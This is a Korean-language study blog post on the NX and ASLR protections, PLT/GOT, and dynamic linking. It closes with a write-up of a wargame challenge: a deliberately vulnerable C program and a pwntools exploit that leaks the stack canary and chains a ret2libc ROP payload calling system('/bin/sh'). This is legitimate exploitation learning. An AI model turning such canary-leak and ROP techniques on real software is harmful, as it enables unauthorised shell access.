---
title: NX, ASLR 학습
published: 2025-09-04
author: siaa
description: 'NX, ASLR, 라이브러리를 배우고 "Return to Library" 문제를 풀었어요'
image: ''
tags: ["Pwn"]
category: 'PWN'
draft: false
---
## 1. **NX** (No-eXexute)
   **정의**: 실행에 사용되는 메모리 영역과 쓰기에 사용되는 메모리 영역을 분리하는 보호기법

   **확인 방법**: `checksec`을 이용하면 **NX**가 적용되었는지 확인 가능

   즉, NX가 적용되었다면 직접 올린 셸코드를 사용할 수 없다.

## 2. **ASLR** (Addreaa Space Layout Randomization)
   **정의**: 바이너리가 실행 될 때마다 스택, 힙, 공유 라이브러리 등을 임의의 주소에 할당하는 보호 기법

   **특징**
       - main함수를 제외한 다른 영역의 주소는 실행할 때마다 변경됨 (PIE 적용 x)
       - libc_base 주소 하위 12 비트 값과 printf 주소 하위 12비트의 값은 항상 같음
       - 리눅스는 페이지 단위로 임의 주소에 매핑함, 12비트 이하로는 주소 변경이 안됨
       - libc_base와 printf, read 의 주소 차이는 항상 같음

## 3. **라이브러리**
   **정의**: 컴퓨터 시스템에서 함수나 변수를 공유해 사용할 수 있도록 함

   **장점**: 같은 함수를 반복적으로 정의할 필요가 없어 개발 효율이 높아짐

   C언어 표준 라이브러리로는 **libc**이 있으며 우분투에 탑제 되어있다.

## 4. **링크**
   **정의**: 컴파일의 마지막 단계

   **역할**: 심볼과 관련된 정보들을 찾아서 최종 파일에 기록하는 일을 함

   **종류**
       - 동적링크: 실행 파일이 작지만 실행 중 라이브러리가 필요하며, 실행 -> 메모리에 매핑 -> 함수 주소 찾기 -> 실행순으로 진행됨
       - 정적링크: 실행 파일이 크지만, 실행 속도가 빠르고 외부 라이브러리 필요 없음

## 5. **PLT**와 **GOT**
   **정의**: 라이브러리에서 동적 링크 된 심볼의 주소를 찾을 때 사용되는 테이블<br

   **runtime resolve**: 라이브러리 함수 호출 -> 라이브러리에서 심볼 탐색 -> 함수의 정의 발견 -> 그 주소로 실행 흐름 옮기는 과정

   **GOT**: resolve된 함수의 주소를 저장하는 테이블

   => 그러나 PLT에서 GOT를 참조하여 실행흐름을 옮길때 GOT값을 검증하지 않기에 GOT의 값을 임의로 변경하면 원하는 코드를 실행시킬 수 있다.

## 6. 푼문제
   NX, ASLR, 라이브러리를 배우고 "Return to Library" 문제를 풀었다.

   다음은 문제이다.
```c
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt'");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```
   7행을 보면 `const char* binsh = "/bin/sh";`가 있는데 이는 **"/bin/sh"**을 바이너리에 추가하기 위한 코드이다.

   16행을 보면 `system("echo 'system@plt'");`가 있는데 이는 **system 함수**를 PLT에 추가하기 위한 코드이다.

   **"/bin/sh"**의 주소와 **system 함수**의 주소를 알기에 rdi가 "/bin/sh"인 상태로 system함수를 호출하면 문제를 풀 수 있다.
   <br>

   GDB에서 `checksec`을 쳐서 카나리가 있는 것을 확인 했다.
   ```
   pwndbg> checksec
   File:     /home/siaa/dreamhack/Return_to_Library/rtl
   Arch:     amd64
   RELRO:      Partial RELRO
   Stack:      Canary found
   NX:         NX enabled
   PIE:        No PIE (0x400000)
   Stripped:   No
   ```
   <br>
   
   우선 카나리를 우회하기 위해 첫번째 입력에서 카나리를 얻었다.
   ```py
   from pwn import*
   p = process("./rtl")
   p.sendlineafter('Buf: ',b'A' * 56)
   k = p.recvuntil(b'\n')
   c = b'\x00' + p.recvn(7)
   print(c)
   ```
   <br>
   
   그리고 rdi값을 "/bin/sh"의 주소로 바꾸고 system함수를 호출했다.

   리턴 가젯을 사용하면 rdi를 pop한 후 "/bin/sh"주소로 바꾸고 system함수를 호출할 수 있다.

   이때 system 함수로 rip가 이동할 때는 항상 스택이 0x10단윌 정렬 되어있어야 한다.
   
   ```py
   from pwn import*
   p = process("./rtl")
   e = ELF('./rtl')

   # canary
   p.sendlineafter('Buf: ',b'A' * 56)
   k = p.recvuntil(b'\n')
   c = b'\x00' + p.recvn(7)
   print(c)
   a = b'\x00' * 56 + c + b'\x00' * 8

   # payload
   system_plt = e.plt['system']
   binsh = 0x400874 # /bin/sh 주소
   pop_rdi = 0x0000000000400853
   ret = 0x0000000000400596
   a = a + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system_plt)
   
   p.sendlineafter(b'Buf: ',a)
   p.interactive()
   ```
   이렇게 했더니 문제가 풀렸다.